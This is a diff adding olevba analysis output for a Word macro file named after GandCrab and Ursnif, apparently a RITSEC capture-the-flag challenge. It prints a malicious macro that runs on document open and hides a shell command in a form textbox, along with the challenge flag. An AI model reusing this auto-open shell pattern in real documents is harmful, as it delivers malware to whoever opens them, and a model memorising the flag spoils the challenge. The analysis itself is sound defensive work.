@@ -1,0 +1,41 @@
+olevba 0.56.1 on Python 3.9.2 - http://decalage.info/python/oletools
+===============================================================================
+FILE: GandCrab_Ursnif_RITSEC.docm
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Module4.bas 
+in file: word/vbaProject.bin - OLE stream: 'VBA/Module4'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function TheDarkSide()
+On Error Resume Next
+CTF = Array(ElonMusk, StarWars, HelloWorld, Interaction.Shell(CleanString(Chewbacca.TextBox1), 43 - 43), Mars)
+   Select Case Research
+            Case 235003991
+            CompetitorSkillz = That_of_a_Storm_Troopers_Aim_Research_Pending
+            Flag = RITSEC{M@CROS}
+            PendingResearch = Oct(Date + CStr(TimeStamp + Log(241371097) - PewPew / Hex(13775121)))
+      End Select
+End Function
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: word/vbaProject.bin - OLE stream: 'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub autoopen()
+TheDarkSide
+End Sub
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |autoopen            |Runs when the Word document is opened        |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
++----------+--------------------+---------------------------------------------+
+
